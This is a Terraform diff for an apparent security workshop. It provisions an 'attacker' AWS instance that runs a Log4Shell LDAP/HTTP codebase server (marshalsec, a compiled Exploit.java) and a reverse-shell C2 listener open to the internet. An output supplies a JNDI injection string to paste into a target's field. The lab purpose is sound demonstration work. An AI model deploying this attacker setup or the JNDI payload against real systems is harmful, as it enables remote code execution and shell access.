@@ -8,8 +8,15 @@ terraform {
   }
 }
 
+variable "aws_profile" {
+  type        = string
+  default     = "surfshop"
+  description = "AWS CLI/SDK profile — always Surfshop (305241527903), never the personal Perkins account."
+}
+
 provider "aws" {
-  region = var.aws_region
+  region  = var.aws_region
+  profile = var.aws_profile
 }
 
 variable "aws_region" {
@@ -152,6 +159,159 @@ resource "aws_instance" "app" {
   }
 }
 
+# --- Attacker box (LDAP / HTTP codebase / C2) — not sensor'd -----------------
+
+variable "attacker_instance_type" {
+  type        = string
+  default     = "t3.micro"
+  description = "Small VM for Log4Shell LDAP + reverse-shell C2 listeners."
+}
+
+resource "tls_private_key" "attacker" {
+  algorithm = "RSA"
+  rsa_bits  = 2048
+}
+
+resource "aws_key_pair" "attacker" {
+  key_name_prefix = "${var.name_prefix}-attacker-"
+  public_key      = tls_private_key.attacker.public_key_openssh
+}
+
+resource "local_file" "attacker_pem" {
+  content         = tls_private_key.attacker.private_key_pem
+  filename        = "${path.module}/attacker.pem"
+  file_permission = "0600"
+}
+
+resource "aws_security_group" "attacker" {
+  name_prefix = "${var.name_prefix}-attacker-"
+  description = "TraditionalJay workshop attacker (LDAP/HTTP/C2)"
+
+  ingress {
+    description = "SSH"
+    from_port   = 22
+    to_port     = 22
+    protocol    = "tcp"
+    cidr_blocks = [var.ssh_ingress_cidr]
+  }
+
+  ingress {
+    description = "Log4Shell LDAP"
+    from_port   = 1389
+    to_port     = 1389
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+
+  ingress {
+    description = "Log4Shell HTTP codebase"
+    from_port   = 8000
+    to_port     = 8000
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+
+  ingress {
+    description = "Reverse-shell C2"
+    from_port   = 4444
+    to_port     = 4444
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+
+  egress {
+    from_port   = 0
+    to_port     = 0
+    protocol    = "-1"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+
+  tags = { Name = "${var.name_prefix}-attacker-sg" }
+}
+
+locals {
+  attacker_user_data = <<-EOF
+    #!/bin/bash
+    set -euxo pipefail
+    export DEBIAN_FRONTEND=noninteractive
+    apt-get update -y
+    apt-get install -y git curl ca-certificates openjdk-11-jdk python3
+
+    git clone --depth 1 --branch "${var.repo_ref}" "${var.repo_url}" /opt/traditionaljay-attacker
+    cd /opt/traditionaljay-attacker
+    chmod +x tools/*.sh tools/*.py
+    ./tools/setup-marshalsec.sh
+    javac -d tools/exploit tools/exploit/Exploit.java
+
+    cat >/usr/local/bin/tj-log4shell-attacker <<'SCRIPT'
+    #!/bin/bash
+    set -euo pipefail
+    PUB_IP="$(curl -fsSL http://169.254.169.254/latest/meta-data/public-ipv4)"
+    exec /opt/traditionaljay-attacker/tools/run-log4shell-ldap.sh --codebase-host "$PUB_IP"
+    SCRIPT
+    chmod +x /usr/local/bin/tj-log4shell-attacker
+
+    cat >/etc/systemd/system/tj-log4shell-attacker.service <<'UNIT'
+    [Unit]
+    Description=TraditionalJay attacker Log4Shell LDAP+HTTP
+    After=network-online.target
+    Wants=network-online.target
+
+    [Service]
+    Type=simple
+    WorkingDirectory=/opt/traditionaljay-attacker
+    ExecStart=/usr/local/bin/tj-log4shell-attacker
+    Restart=on-failure
+    RestartSec=3
+
+    [Install]
+    WantedBy=multi-user.target
+    UNIT
+
+    cat >/etc/systemd/system/tj-c2-attacker.service <<'UNIT'
+    [Unit]
+    Description=TraditionalJay attacker C2 banner listener
+    After=network-online.target
+    Wants=network-online.target
+
+    [Service]
+    Type=simple
+    WorkingDirectory=/opt/traditionaljay-attacker
+    ExecStart=/usr/bin/python3 /opt/traditionaljay-attacker/tools/c2-listen.py --host 0.0.0.0 --port 4444
+    Restart=on-failure
+    RestartSec=3
+
+    [Install]
+    WantedBy=multi-user.target
+    UNIT
+
+    systemctl daemon-reload
+    systemctl enable --now tj-log4shell-attacker.service tj-c2-attacker.service
+  EOF
+}
+
+resource "aws_instance" "attacker" {
+  ami                         = data.aws_ami.ubuntu.id
+  instance_type               = var.attacker_instance_type
+  key_name                    = aws_key_pair.attacker.key_name
+  vpc_security_group_ids      = [aws_security_group.attacker.id]
+  user_data                   = local.attacker_user_data
+  user_data_replace_on_change = true
+  associate_public_ip_address = true
+
+  root_block_device {
+    volume_size           = 8
+    volume_type           = "gp3"
+    delete_on_termination = true
+  }
+
+  tags = {
+    Name    = "${var.name_prefix}-attacker"
+    Project = "TraditionalJay"
+    Role    = "attacker"
+  }
+}
+
 output "public_ip" {
   value = aws_instance.app.public_ip
 }
@@ -166,4 +326,21 @@ output "security_url" {
 
 output "upwind_sensor_bootstrap" {
   value = nonsensitive(var.upwind_client_id) != "" ? "enabled (host sensor via cloud-init)" : "disabled (set upwind_client_id/secret)"
+}
+
+output "attacker_public_ip" {
+  value = aws_instance.attacker.public_ip
+}
+
+output "attacker_ssh" {
+  value = "ssh -i infrastructure/aws/attacker.pem ubuntu@${aws_instance.attacker.public_ip}"
+}
+
+output "attacker_ldap_callback" {
+  value       = "${aws_instance.attacker.public_ip}:1389"
+  description = "Paste into /security LDAP field or search: $${jndi:ldap://IP:1389/a}"
+}
+
+output "attacker_c2_callback" {
+  value = "${aws_instance.attacker.public_ip}:4444"
 }
